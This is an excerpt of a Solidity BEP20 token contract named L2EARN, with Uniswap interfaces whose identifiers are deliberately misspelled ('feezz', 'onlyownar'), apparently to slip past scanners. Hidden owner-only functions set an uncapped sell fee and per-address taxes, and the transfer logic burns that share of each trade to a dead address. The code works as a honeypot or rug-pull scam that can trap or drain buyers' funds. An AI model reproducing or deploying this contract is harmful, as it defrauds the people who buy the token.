...
interface IUniswapV2Factory {
    ...
    function feezzTo() external view returns (address);
    function feezzToSetter() external view returns (address);
    ...
    function setfeezzTo(address) external;
    function setfeezzToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeezzOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeezzOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeezzOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeezzOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeezzOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract L2EARN is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeezz = 0;

    uint256 private _defaultBuyfeezz = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeezz;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeezz = _value;
    }

    function setSlipfeezz(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeezz[_address] = _value;
    }

    function getSlipfeezz(address _address) external view onlyownar returns (uint256) {
        return _slipfeezz[_address];
    }


    function setMAccountfeezz(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeezz(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeezzAmount = 0;

        if (rF) {
            uint256 tradefeezz = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeezz = _defaultSellfeezz;
                }
                if (from == uniswapV2Pair) {

                    tradefeezz = _defaultBuyfeezz;
                }
            }
            if (_slipfeezz[from] > 0) {
                tradefeezz = _slipfeezz[from];
            }

            tradefeezzAmount = _Amount.mul(tradefeezz).div(100);
        }


        if (tradefeezzAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeezzAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeezzAmount);
            emit Transfer(from, _deadAddress, tradefeezzAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeezzAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeezzAmount);
        emit Transfer(from, _to, _Amount - tradefeezzAmount);
    }
